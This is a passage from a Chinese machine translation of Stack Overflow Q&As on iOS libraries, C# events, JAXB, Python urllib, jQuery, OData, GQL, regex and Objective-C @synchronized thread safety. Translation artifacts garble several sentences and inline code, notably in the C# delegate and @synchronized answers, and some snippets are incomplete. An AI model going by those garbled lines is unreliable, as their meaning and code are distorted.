老实说，尽管这可能不适用于每个人，但我只会将它们作为单独的文本字段而不是通过 for 循环创建新文本字段

```
JTextField a = new JTextField();
and so on..... 
```

# objective-c - 如何从 iOS 库中提取目标文件（在 Mac 上）？

> ID：15392700
> 
> 赞同：3
> 
> 时间：2013-03-13T17:47:40.483
> 
> 标签：objective-c, xcode, static-libraries, unix-ar, xcrun

我有一个第三方 iOS 库，可以在我的应用程序和模拟器中链接并正常运行。我正在尝试从中提取目标文件，以便将其与另一款第三方软件集成，后者使用自己的代码重新打包目标文件。但是，我无法通过提取目标文件`ar`；我一直收到错误消息“不适当的文件类型或格式”。

有问题的库是一个包含 armv7、armv7s 和 i386 的胖库。Stock`lipo`不知道我机器上的 armv7s，但 Xcode 知道：

```
$ lipo -info library.a
Architectures in the fat file: library.a are: armv7 (cputype (12) cpusubtype (11)) i386 
$ xcrun -sdk iphoneos lipo -info library.a 
Architectures in the fat file: library.a are: armv7 armv7s i386 
```

我可以通过以下方式成功地将其稀释`lipo`：

```
$ xcrun -sdk iphoneos lipo library.a -thin armv7 -output library-armv7.a
$ xcrun -sdk iphoneos lipo -info library-armv7.a 
Non-fat file: library-armv7.a is architecture: armv7 
```

但是，即使将其稀释后，我也无法使用以下方法对其进行操作`ar`：

```
$ xcrun -sdk iphoneos ar -tv library-armv7.a 
ar: library-armv7.a: Inappropriate file type or format
$ xcrun -sdk iphoneos ar -xv library-armv7.a 
ar: library-armv7.a: Inappropriate file type or format 
```

我在安装了开发工具的 OS X 10.8.2、Xcode 4.6 上。

对于这个麻烦的库，我可以采取任何额外的步骤吗？

**更新以回应马丁的评论**

`file`显示以下内容：

```
$ file library.a
library.a: Mach-O universal binary with 3 architectures
library.a (for architecture armv7): Mach-O object arm
library.a (for architecture cputype (12) cpusubtype (11)):  Mach-O object arm
library.a (for architecture i386):  Mach-O object i386
$ file library-armv7.a 
library-armv7.a: Mach-O object arm 
```

看起来它根本不是图书馆！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T19:24:20.457

“库”实际上不是库，而是目标文件本身。没有什么可以进一步提取的了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-23T03:35:52.723

这个脚本运行良好。尝试一下。

[https://code.google.com/p/ompt-intel-openmp/source/browse/itt/libomp_oss/tools/extract-objects.pl](https://code.google.com/p/ompt-intel-openmp/source/browse/itt/libomp_oss/tools/extract-objects.pl)

# c# - 正确使用动作和事件

> ID：15392702
> 
> 赞同：9
> 
> 时间：2013-03-13T17:47:42.060
> 
> 标签：c#, events

我有点新，`c#`所以如果你觉得它微不足道，请忽略。我看到了以下“奇怪”的代码。

任何人都可以对此有所了解。

```
public event Action _action;

if (_action != null)            
{
    foreach (Action c in _action.GetInvocationList())
    {
         _action -= c;
    }
} 
```

特别是`_action -= c;`部分。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-03-13T17:52:51.507

一个委托可以是多个函数的委托。如果您有一个委托`alpha`给的委托`Alpha()`和一个委托给的`beta`委托，`Beta()`那么`gamma = alpha + beta;`就是一个调用`Alpha()`then的委托`Beta()`。 `gamma - beta`产生一个调用`Alpha()`. 坦率地说，这有点奇怪。

您发布的代码很*奇怪*。它说“遍历正在运行的函数列表，生成一大堆调用越来越少的函数的委托，然后最终分配一个对`action`.用它。`null``action`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-13T17:51:27.280

```
public event Action _action; //an event

if (_action != null) // are there any subscribers?

{
        foreach (Action c in _action.GetInvocationList()) //get each subscriber
        {
            _action -= c; //remove its subscription to the event
        }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-13T17:49:43.040

它正在删除该操作的处理程序。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-13T17:52:19.800

事件实际上是一个[`MultiCastDelegate`](http://msdn.microsoft.com/en-us/library/system.multicastdelegate.aspx). 当您“附加”一个事件处理程序时，它会添加对它的`InvocationList`.

上面的代码将 中的每个事件处理程序`InvocationList`与事件分离——本质上是“清除”事件，这也可以通过`_action = null`.

# jaxb - 扩展 XmlAdapter 以处理 ArrayList 用引号将 [ ... ] 括起来

> ID：15392707
> 
> 赞同：1
> 
> 时间：2013-03-13T17:47:56.383
> 
> 标签：jaxb, jersey, xmladapter

为了解决 Jersey 中无法正确序列化具有（仅）一个元素的列表的错误，即：

```
"list":"thing" 
```

代替

```
"list": [ "thing" ] 
```

我已经编写了下面的代码，它几乎可以解决它，但是（真气）让我无法告诉它不要将整个结果用双引号括起来，如下所示：

```
"list": "[ "thing" ]" 
```

我别无选择，我会非常感谢任何看透这一点的人。请注意，我还尝试将ContextResolver *< JAXBContext >*作为一些帖子建议的*@Provider*解决方案，但 Jersey 根本不会调用该代码。此解决方案是唯一接近的解决方案。

顺便说一下，这是 POJO 中的消费字段：

```
@XmlAnyElement
@XmlJavaTypeAdapter( JaxBListAdapter.class )
private List< String > list = new ArrayList< String >(); 
```

这是代码：

```
public class JaxBListAdapter extends XmlAdapter< Element, List< String > >
{
    private static Logger log = Logger.getLogger( JaxBListAdapter.class );

    private DocumentBuilder documentBuilder =
                   DocumentBuilderFactory.newInstance().newDocumentBuilder();

    @Override
    public Element marshal( List< String > list )
    {
        Document document    = documentBuilder.newDocument();
        Element  rootElement = document.createElement( "list" );

        document.appendChild( rootElement );

        if( list != null )
        {
            StringBuilder sb = new StringBuilder();

            sb.append( "[ " );

            boolean first = true;

            for( String item : list )
            {
                if( first )
                    first = false;
                else
                    sb.append( ", " );

                sb.append( "\"" + item + "\"" );
            }

            sb.append( " ]" );

            rootElement.setTextContent( sb.toString() );
        }

        return rootElement;
    }

    @Override
    public List< String > unmarshal( Element rootElement )
    {
        // Hmmmm... never callled?
        NodeList       nodeList = rootElement.getChildNodes();
        List< String > list     = new ArrayList< String >( nodeList.getLength() );

        for( int x = 0; x < nodeList.getLength(); x++ )
        {
            Node node = nodeList.item( x );

            if( node.getNodeType() == Node.ELEMENT_NODE )
                list.add( node.getTextContent() );
        }

        return list;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:47:07.697

我希望我不会通过发布这个解决方法来冒犯任何人，有些人可能会指责它与原始问题无关或仅与原始问题有间接关系。这是我试图使用问题中的方法解决的问题的解决方案。出于相同原因查看该问题的人可能会发现这很有用。

最终，使用*ContextResolver< JAXBContext >*的解决方案有效。

这是我的代码：

```
package com.acme.web.user.pojo;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

import javax.ws.rs.ext.ContextResolver;
import javax.ws.rs.ext.Provider;
import javax.xml.bind.JAXBContext;
import javax.xml.bind.JAXBException;

import com.sun.jersey.api.json.JSONConfiguration;
import com.sun.jersey.api.json.JSONJAXBContext;

/**
 * This class will solve lists containing only one member which Jersey doesn't bracket.
 * It ensures the brackets [ ... ] in generated JSON.
 */
@Provider
public class JaxBContextResolver implements ContextResolver< JAXBContext >
{
    private final JAXBContext context;

    @SuppressWarnings( "rawtypes" )
    private final Set< Class > types;

    @SuppressWarnings( "rawtypes" )
    private final Class[] classTypes = { Account.class };

    @SuppressWarnings( "rawtypes" )
    public JaxBContextResolver() throws JAXBException
    {
        context = new JSONJAXBContext( JSONConfiguration.natural().build(), classTypes );
        types   = new HashSet< Class >( Arrays.asList( classTypes ) );
    }

    public JAXBContext getContext( Class< ? > objectType )
    {
        return types.contains( objectType ) ? context : null;
    }
} 
```

但是，您也必须将包添加到*web.xml*中，否则 Jersey 不会去寻找这个类作为*@Provider*。

```
<init-param>
  <param-name>com.sun.jersey.config.property.packages</param-name>
  <param-value>com.acme.web.user.pojo</param-value>
</init-param> 
```

# python - 使用 urllib 将具有多个变量的字符串作为 POST 数据发送的最有效方法

> ID：15392710
> 
> 赞同：0
> 
> 时间：2013-03-13T17:48:02.747
> 
> 标签：python, urllib

我觉得不得不发布这个真的很愚蠢，但我是 Python 的新手，它不像我知道的 PHP。

我有一串数据，其中包含 1 个或多个变量，例如：

```
"var1=value1&var2=value2&var3=value3" 
```

我需要使用 urllib 使用 POST 将此数据发送到 Web 服务器。

我手动格式化 POST 数据并发送它没有问题，但是我无法弄清楚如何使用代码执行此操作，而无需编写复杂的代码。

使用 split('&') 把这个字符串变成一个数组是很容易的，但是然后呢？

看起来我需要将数据转换为以下语法，然后才能对其进行 urllib.urlencode：

```
{"var1":"value1","var2":"value2","var3":"value3"} 
```

任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:52:00.810

Python 具有用于大多数操作的函数，您将不得不使用查询字符串/url。你可以把你的字符串变成一个字典（如下所示）

```
Python 2.7.3 (default, Aug  1 2012, 05:14:39) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> qs = "var1=value1&var2=value2&var3=value3"
>>> from urlparse import parse_qs
>>> parse_qs(qs)
{'var1': ['value1'], 'var3': ['value3'], 'var2': ['value2']}
>>> data_dict = parse_qs(qs)      
>>> import urllib
>>> post_data_str = urllib.urlencode(data_dict)
>>> post_data_str
'var1=%5B%27value1%27%5D&var3=%5B%27value3%27%5D&var2=%5B%27value2%27%5D' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T18:09:07.727

您可以使用 split('&') 分解变量，然后遍历结果列表并使用 split('=') 分解每个变量及其单独的值，然后将这些值插入到空字典中。就像是：

```
myDataString = "var1=value1&var2=value2&var3=value3"
mySplitData = myDataString.split('&')

import collections
myDict = collections.defaultdict(list)

for value in mySplitData:
    splitValue = value.split('=')
    myDict[splitValue[0]] 
```

~~请注意，这是未经测试的代码，我将对此进行测试并回复您。~~

***编辑*：**测试并更新了代码。

# javascript - jQuery ajax 双重调用

> ID：15392713
> 
> 赞同：0
> 
> 时间：2013-03-13T17:48:04.950
> 
> 标签：javascript, jquery, ajax

我有 jquery(ajax) 的问题，我有这个功能：

```
page: function(p, cont) {

    cont = typeof cont !== 'undefined' ? cont : this;

    $.ajax({
        url: p,
        timeout: 10000,
        complete: function() {...}
    }).done(function(html) {
        $(cont).append(html);
    });

} 
```

当我在 html (onClick) 中使用此功能时，每次单击按钮请求重复时，如何防止这种情况发生？我只想加载一次内容。

*注意：此功能由多个按钮使用，而不仅仅是一个。*

谢谢！

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-13T17:54:26.497

您可以尝试将全局范围内的变量用作“阻止程序”，例如：

```
var blocker = false;

page: function(p, cont) {
    if(!blocker){
        blocker = true;
    }else{
        return;
    }
    cont = typeof cont !== 'undefined' ? cont : this;   
    $.ajax({
        url: p,
        timeout:10000,
        complete: function() { ... }
        }).done(function(html) {
            $(cont).append(html);
    });

} 
```

# asp.net-web-api - Web Api Odata 不工作

> ID：15392716
> 
> 赞同：0
> 
> 时间：2013-03-13T17:48:24.547
> 
> 标签：asp.net-web-api, odata

我创建了一个 Web Api OData 控制器并尝试直接查看它，但它不起作用。

WebApiConfig 配置

```
 public static void Register(HttpConfiguration config)
    {
      config.Routes.MapODataRoute("odata", "odata", GetEdmModel());
      config.Routes.MapHttpRoute(
          name: "DefaultApi",
          routeTemplate: "api/{controller}/{id}",
          defaults: new { id = RouteParameter.Optional }
      );
    }

    public static IEdmModel GetEdmModel()
    {
      ODataModelBuilder builder = new ODataConventionModelBuilder();
      builder.EntitySet<Customer>("Customers");
      builder.Namespace = "PackageManager.Models";
      return builder.GetEdmModel();
    } 
```

在 App 开始调用注册：

```
WebApiConfig.Register(GlobalConfiguration.Configuration); 
```

API 控制器：

```
public class CustomersController : EntitySetController<Customer, string>
  {
    NorthwindDbContext _Context = new NorthwindDbContext();

    [Queryable]
    public override IQueryable<Customer> Get()
    {
      return _Context.Customers;
    }

    protected override void Dispose(bool disposing)
    {
      base.Dispose(disposing);
           _Context.Dispose();
    }
  } 
```

尝试访问：localhost:2375/odata/Customers

然后总是出错：

**无法找到该资源。**

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-05-04T10:52:16.803

只需在 system.webServer\handler 上的 web.config 中添加以下内容：

```
<add name="ApiURIs-ISAPI-Integrated-4.0" path="*" verb="GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" /> 
```

或更换

```
<add name="ExtensionlessUrlHandler-Integrated-4.0" path="*." verb="*" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" /> 
```

至

```
<add name="ExtensionlessUrlHandler-Integrated-4.0" path="*" verb="*" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" /> 
```

（不同 - 路径属性中的一个点）

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-06-11T07:36:30.503

@Parwej - 尝试在您的 webapi.config 而不是您的代码中编写以下代码。还要确保在您的 URL 中遵循正确的大小写，因为 Odata url 区分大小写。并且不要忘记在控制器中使用 System.Web.Http.OData 而不是 System.Web.Odata。这应该有效。

```
public static void Register(HttpConfiguration config)
{
  ODataModelBuilder builder = new ODataConventionModelBuilder();
  builder.EntitySet<Customer>("Customers");
  config.Routes.MapODataRoute("odata", "odata", builder.GetEdmModel());
} 
```

# arrays - 相邻掉期的最小数量

> ID：15392717
> 
> 赞同：2
> 
> 时间：2013-03-13T17:48:25.637
> 
> 标签：arrays, algorithm

这是在线笔试的问题之一。

编号为 (1...N) 的书籍已到达仓库。

如果书“i”仅出现在书“i+1”的左侧（对于所有 i，1 <= i <= N-1）并且书 N 出现在书 1 的左边。[是的！任何循环排序的序列都是最佳排列]

收到的书是随机顺序的。现在你的任务是找出实现上述最佳排列所需的最少移动次数。

请注意，唯一有效的移动是选择一对相邻的书并让它们交换位置。

例如，如果书籍最初的顺序是 3 5 4 2 1

解决办法可以

一个。首先交换第二对书： { result : 3 4 5 2 1 }

湾。交换最右边的一对：{ result : 3 4 5 1 2 }

因此，在 2 步中，我们实现了最佳安排。

我尝试但无法找到解决方案。首先我将数组分成两个数组，然后我将对两个数组应用插入排序，但这也不起作用。请帮我找出这个问题的算法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T18:11:17.937

N,1 可以是序列中的任何位置。例如 1..5，可以是 3,4,5,1,2。所以第一个数字可能是 1..5，即比[Previous question](https://stackoverflow.com/questions/15364607/given-an-array-of-integers-in-random-order-you-have-to-find-the-minimum-number-o)复杂 5 倍。所以，你必须做5次。使用具有可替换比较功能的排序算法。

因此，对于第三次测试，比较将是：-

```
// returns <0, 0 or >0
int compare(a,b){
     return ((b+N-3)%N) - ((a+N-3)%N);
} 
```

# python - 使用 GQL 获取自上一个结果以来的所有新结果

> ID：15392721
> 
> 赞同：0
> 
> 时间：2013-03-13T17:48:33.713
> 
> 标签：python, google-app-engine, gql, gqlquery

在查询方面我非常没用，我想知道这个问题的正确结构是什么。

向客户端发送的数据包括对象的密钥，他们使用密钥告诉服务器他们最近下载的对象是什么。

我想从那时起获取所有对象，这些对象具有自动日期属性。

此外，我希望能够将 15 个（左右）最近的对象提供给可能使用特定“新用户”密钥或类似内容请求的新用户。

使用Python2.7运行时，之前没用过GQL，

任何帮助是极大的赞赏。

模型类是这样的：

```
class Message(db.Model):
    user = db.StringProperty()
    content = db.TextProperty()
    colour = db.StringProperty()
    room = db.StringProperty()
    date = db.DateTimeProperty(auto_now_add=True) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T03:01:27.273

如果它是 db.Key 对象或使用 db（相对于 ndb）API 的键的字符串表示：

`last_message = Message.get(lastkey)`

如果您有其他表示形式的密钥，例如密钥名称：

`last_message = Message.get_by_key_name(lastkey)`

如果您将密钥作为对象的数字 ID：

`last_message = Message.get_by_id(int(lastkey))`

然后，您可以获得自上一条消息以来的消息，如下所示：

```
messages_since_last_message = Message.all().filter('date >', last_message.date).order('date')
#OR GQL:
messages_since_last_message = Message.gql("WHERE date > :1 ORDER BY date ASC", last_message.date) 
```

您可能应该`>=`只使用比较器，因为可能有多个消息同时到达，然后过滤掉列表中的所有消息，包括您要查找的最后一个键（这实际上取决于您的使用情况以及消息的书写程度）。此外，使用 High Replication 数据存储时，存在最终一致性，因此您的查询不能保证准确反映数据存储，除非您使用祖先查询，在这种情况下，您将实体组限制为每秒约 1 次写入，这同样取决于您的用例可能不是问题。这里的实体组反映了父模型及其所有子祖先。祖先组驻留在单个实体组上。

# regex - 如何用原始文本减去 & 替换“&A-Z”

> ID：15392725
> 
> 赞同：1
> 
> 时间：2013-03-13T17:48:45.903
> 
> 标签：regex, vb.net

我正在寻找一种在文本字符串后面替换“&”的方法。例如;

输入文本：“New&w && Edit Record” 所需输出：New & Edit Record”

"New&w" 的原因是 "&" 然后将 w 显示为快捷键（在 UI 中下划线），而 "&&" 的原因是在文本中显示单个 "&"。

当使用输入文本作为命令按钮上文本属性的值时，文本会按预期显示，但是当我将文本属性传递给消息框时，它会在消息框对话框中显示输入文本。

我不想使用 Tag 属性将我想要的消息存储在消息框中，因为我将 tag 属性用于另一个值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:05:10.447

试试这个：

```
Dim input As String = "Ne&w && Edit Record"
Dim output As String = "New & Edit Record"
Dim p As String = Regex.Replace(input, "&(?<first>\w|&)", "${first}")
MessageBox.Show(output = p) 'shows True 
```

在上面的 Regex 表达式中，我捕获了一个＆符号，后跟一个字母或另一个＆符号，并用＆符号后面的符号替换该序列。`<first>`是一个命名组，它用于正则表达式替换。

请参阅[MSDN 上的 Regex.Replace](http://msdn.microsoft.com/en-us/library/e7f5w83z.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:09:35.290

您可以删除所有`&`未跟随标志的`&`标志。像这样匹配它们：

```
&(?!&) 
```

看到它在[行动](http://regex101.com/r/aW7oL8)

# ios - @synchronized 是否保证线程安全？

> ID：15392726
> 
> 赞同：33
> 
> 时间：2013-03-13T17:48:50.990
> 
> 标签：ios, objective-c, macos, cocoa, synchronized

参考这个[答案](https://stackoverflow.com/questions/10853529/locking-an-object-from-being-accessed-by-multiple-threads-objective-c)，我想知道这是正确的吗？

> @synchronized 不会使任何代码“线程安全”

当我试图找到任何文档或链接来支持这个声明时，没有成功。

对此的任何评论和/或答案将不胜感激。

*为了更好的线程安全，我们可以使用其他工具，这是我所知道的。*

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2013-03-13T18:10:17.713

`@synchronized`如果使用得当，确实会使代码线程安全。

例如：

假设我有一个访问非线程安全数据库的类。我不想同时读取和写入数据库，因为这可能会导致崩溃。

所以可以说我有两种方法。storeData: 和 readData 在名为 LocalStore 的单例类上。

```
- (void)storeData:(NSData *)data
 {
      [self writeDataToDisk:data];
 }

 - (NSData *)readData
 {
     return [self readDataFromDisk];
 } 
```

现在，如果我要像这样将这些方法中的每一个分派到它们自己的线程上：

```
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
      [[LocalStore sharedStore] storeData:data];
 });
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
      [[LocalStore sharedStore] readData];
 }); 
```

我们很可能会崩溃。但是，如果我们将 storeData 和 readData 方法更改为使用`@synchronized`

```
 - (void)storeData:(NSData *)data
 {
     @synchronized(self) {
       [self writeDataToDisk:data];
     }
 }

 - (NSData *)readData
 { 
     @synchronized(self) {
      return [self readDataFromDisk];
     }
 } 
```

现在这段代码将是线程安全的。重要的是要注意，如果我删除其中一个`@synchronized`语句，那么代码将不再是线程安全的。或者，如果我要同步不同的对象而不是`self`.

`@synchronized`在您正在同步的对象上创建互斥锁。因此，换句话说，如果任何代码想要访问`@synchronized(self) { }`块中的代码，它就必须排在同一块中运行的所有先前代码的后面。

如果我们要创建不同的 localStore 对象，则`@synchronized(self)`只会单独锁定每个对象。那有意义吗？

像这样想。您有一大群人在不同的队伍中等待，每条线路的编号为 1-10。您可以选择希望每个人在哪一行等待（通过按每行同步），或者如果您不使用`@synchronized`，您可以直接跳到前面并跳过所有行。第 1 行的人不必等待第 2 行的人完成，但第 1 行的人必须等待他们前面的每个人完成。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-03-13T18:32:45.373

我认为问题的本质是：

> 正确使用同步是否能够解决任何线程安全问题？

从技术上讲是的，但在实践中，建议学习和使用其他工具。

* * *

我会在不假设以前的知识的情况下回答。

**正确的代码**是符合其规范的代码。一个好的规范定义

*   约束状态的不变量，
*   描述操作效果的前置条件和后置条件。

**线程安全代码**是在由多个线程执行时保持正确的代码。因此，

*   任何操作顺序都不能违反规范。¹
*   在多线程执行期间，不变量和条件将保持不变，而无需客户端²进行额外的同步。

高级别的要点是：线程安全要求规范在多线程执行期间成立。要实际编写代码，我们只需要做一件事：规范对可变共享状态³的访问。有三种方法可以做到：

*   阻止访问。
*   使状态不可变。
*   同步访问。

前两个很简单。第三个需要防止以下线程安全问题：

*   **活力**
    *   **死锁**：两个线程永久阻塞等待对方释放所需的资源。
    *   **livelock**：一个线程正忙于工作，但它无法取得任何进展。
    *   **饥饿**：一个线程永远被拒绝访问它需要的资源以取得进展。
*   **安全发布**：发布对象的引用和状态必须同时对其他线程可见。
*   **竞争条件**竞争条件是一种缺陷，其输出取决于不可控事件的时间。换句话说，当获得正确答案依赖于幸运的时机时，就会发生竞争条件。任何复合操作都可能遭受竞争条件，例如：“check-then-act”、“put-if-absent”。一个示例问题是`if (counter) counter--;`，几个解决方案之一是`@synchronize(self){ if (counter) counter--;}`。

为了解决这些问题，我们使用了`@synchronize`volatile、内存屏障、原子操作、特定锁、队列和同步器（信号量、屏障）等工具。

回到问题：

> 正确使用@synchronize 能够解决任何线程安全问题吗？

技术上是的，因为上面提到的任何工具都可以用`@synchronize`. 但这会导致性能不佳并增加与活性相关的问题的机会。相反，您需要针对每种情况使用适当的工具。例子：

```
counter++;                       // wrong, compound operation (fetch,++,set)
@synchronize(self){ counter++; } // correct but slow, thread contention
OSAtomicIncrement32(&count);     // correct and fast, lockless atomic hw op 
```

在链接问题的情况下，您确实可以使用`@synchronize`，或 GCD 读写锁，或创建带有锁剥离的集合，或任何情况需要。正确答案取决于使用模式。无论如何，您都应该在课堂上记录您提供的线程安全保证。

* * *

¹ [即看到对象处于无效状态或违反前置/后置条件。]

² [例如，如果线程 A 迭代了一个集合 X，而线程 B 删除了一个元素，则执行会崩溃。这是非线程安全的，因为客户端必须在 X ( `synchronize(X)`) 的内在锁上同步才能拥有独占访问权限。但是，如果迭代器返回集合的副本，则集合变为线程安全的。]

³ [不可变共享状态或可变非共享对象始终是线程安全的。]

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2013-10-17T16:06:41.097

通常，`@synchronized`保证线程安全，但仅在正确使用时。递归获取锁也是安全的，尽管我在[此处](https://stackoverflow.com/questions/10163456/locked-up-waiting-for-synchronized/19429880#19429880)的回答中详细说明了一些限制。

有几种常见的使用`@synchronized`错误的方法。这些是最常见的：

用于`@synchronized`确保创建原子对象。

```
- (NSObject *)foo {
    @synchronized(_foo) {
        if (!_foo) {
            _foo = [[NSObject alloc] init];
        }
        return _foo;
    }
} 
```

因为在第一次获得锁时将为 nil，所以不会发生锁定，并且多个线程可能会在第一次完成之前`_foo`创建自己的。`_foo`

用于每次`@synchronized`锁定一个新对象。

```
- (void)foo {
    @synchronized([[NSObject alloc] init]) {
        [self bar];
    }
} 
```

我已经看过很多这段代码，以及 C# 等效的`lock(new object()) {..}`. 由于它每次都尝试锁定一个新对象，因此它总是被允许进入代码的关键部分。这不是某种代码魔术。它绝对不能确保线程安全。

最后，锁定`self`.

```
- (void)foo {
    @synchronized(self) {
        [self bar];
    }
} 
```

虽然本身不​​是问题，但如果您的代码使用任何外部代码或者本身就是一个库，则可能是一个问题。虽然对象在内部被称为`self`，但它在外部有一个变量名。如果外部代码调用`@synchronized(_yourObject) {...}`并且您调用`@synchronized(self) {...}`，您可能会发现自己陷入僵局。最好创建一个不暴露在对象外部的内部对象来锁定。在您的 init 函数中添加`_lockObject = [[NSObject alloc] init];`便宜、简单且安全。

编辑：

我仍然被问到关于这篇文章的问题，所以这里有一个例子说明为什么`@synchronized(self)`在实践中使用它是一个坏主意。

```
@interface Foo : NSObject
- (void)doSomething;
@end

@implementation Foo
- (void)doSomething {
    sleep(1);
    @synchronized(self) {
        NSLog(@"Critical Section.");
    }
}

// Elsewhere in your code
dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
Foo *foo = [[Foo alloc] init];
NSObject *lock = [[NSObject alloc] init];

dispatch_async(queue, ^{
    for (int i=0; i<100; i++) {
        @synchronized(lock) {
            [foo doSomething];
        }
        NSLog(@"Background pass %d complete.", i);
    }
});

for (int i=0; i<100; i++) {
    @synchronized(foo) {
        @synchronized(lock) {
            [foo doSomething];
        }
    }
    NSLog(@"Foreground pass %d complete.", i);
} 
```

应该很清楚为什么会发生这种情况。锁定`foo`并`lock`在前台 VS 后台线程上以不同的顺序调用。很容易说这是不好的做法，但如果`Foo`是库，用户不太可能知道代码包含锁。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-03-13T18:10:43.110

@synchronized 单独不会使代码线程安全，但它是编写线程安全代码时使用的工具之一。

对于多线程程序，通常需要将复杂结构保持在一致的状态，并且一次只希望一个线程具有访问权限。常见的模式是使用互斥锁来保护访问和/或修改结构的代码的关键部分。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2015-01-08T09:08:30.757

`@synchronized`是`thread safe`机制。在此函数中编写的一段代码成为 的一部分`critical section`，一次只能执行一个线程。

`@synchronize`隐式应用锁而`NSLock`显式应用它。

**它只保证线程安全，而不是保证。**我的意思是您为您的汽车聘请了一位专业的司机，但这并不能保证汽车不会发生事故。然而，概率仍然是微乎其微的。

`GCD`它在（大中央调度）中的同伴是`dispatch_once`。dispatch_once 与 to 做同样的工作`@synchronized`。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-14T07:06:28.807

该`@synchronized`指令是在 Objective-C 代码中动态创建互斥锁的便捷方式。

互斥锁的副作用：

1.  死锁
2.  饥饿

线程安全将取决于`@synchronized`块的使用。

# iphone - 双击缩放崩溃并在 iOS 中显示无法识别的扇区

> ID：15392727
> 
> 赞同：0
> 
> 时间：2013-03-13T17:48:52.340
> 
> 标签：iphone, ios, ios5

我想实现双击放大和缩小。所以在我的项目中，我没有使用任何 xib 或情节提要它的纯编程视图（硬编码）。我的项目中没有滚动视图，所以我添加了滚动视图并将我的图像视图作为子视图添加到 scoll 视图中。

比我使用“UIGestureRecognizer”和“触摸开始”但是当我双击我的应用程序时崩溃。我不认识问题，因为我是 IOS 新手 请提出一些解决方案

这是我的代码

```
ScrollView = [[UIScrollView alloc] initWithFrame:CGRectMake(0.0, 0.0, 1024,768)];
UIView *mixContainerView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 1024, 768)];
mixContainerView.backgroundColor = [UIColor clearColor];
[mixContainerView addSubview:ScrollView];
backgroundImageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 1024, 768)];
backgroundImageView.image = [UIImage imageNamed:[NSString stringWithFormat:@"app%03d_location%02d_background", location.application.id.intValue, location.id.intValue]];
[ScrollView addSubview:backgroundImageView];

  - (void)tapTwice:(UIGestureRecognizer *)gestureRecognizer{
//on a double tap, call zoomToRect in UIScrollView
float newScale = [ScrollView zoomScale] * 1.5;
if (newScale > self.ScrollView.maximumZoomScale){
    newScale = self.ScrollView.minimumZoomScale;
    CGRect zoomRect = [self zoomRectForScale:newScale withCenter:[gestureRecognizer locationInView:gestureRecognizer.view]];
    [ScrollView zoomToRect:zoomRect animated:YES];}
else{
    newScale = self.ScrollView.maximumZoomScale;
    CGRect zoomRect = [self zoomRectForScale:newScale withCenter:[gestureRecognizer locationInView:gestureRecognizer.view]];
    [ScrollView zoomToRect:zoomRect animated:YES];}}
 // Touch began for touch event to display and hide controll buttons
- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {
 if(((UITouch *)[touches anyObject]).tapCount == 2)
  {
    UITapGestureRecognizer *tapTwice = [[UITapGestureRecognizer alloc] initWithTarget:self  action:@selector(tapTwice)];
    tapTwice.numberOfTapsRequired = 2;
    //stops tapOnce from overriding tapTwice
    //then need to add the gesture recogniser to a view - this will be the view that recognises the gesture
    [self.view addGestureRecognizer:tapTwice];

  else{
  if(screenTimer)
   {
    [screenTimer invalidate];
    screenTimer = nil;
   }
   mode1View.hidden=NO;
   screenTimer = [NSTimer scheduledTimerWithTimeInterval:3.0 target:self selector:@selector(turnOffScreen) userInfo:nil repeats:NO];}}
 - (void)turnOffScreen{
NSLog(@"TURN OFF SCREEN");
if(screenTimer!=nil)
{
mode1View.hidden=YES;
}}
- (CGRect)zoomRectForScale:(float)scale withCenter:(CGPoint)center {

CGRect zoomRect;

// the zoom rect is in the content view's coordinates.
//    At a zoom scale of 1.0, it would be the size of the imageScrollView's bounds.
//    As the zoom scale decreases, so more content is visible, the size of the rect grows.
zoomRect.size.height = [ScrollView frame].size.height / scale;
zoomRect.size.width  = [ScrollView frame].size.width  / scale;

// choose an origin so as to get the right center.
zoomRect.origin.x    = center.x - (zoomRect.size.width  / 2.0);
zoomRect.origin.y    = center.y - (zoomRect.size.height / 2.0);

return zoomRect; 
```

}

错误

```
 unrecognized selector sent to instance 0x7b2f540
 2013-03-13 18:46:09.960 VSL[9352:c07] *** Terminating app due to uncaught exception '  NSInvalidArgumentException', reason: '-[ViewController tapTwice]: unrecognized   selector sent to instance 0x7b2f540'
*** First throw call stack:
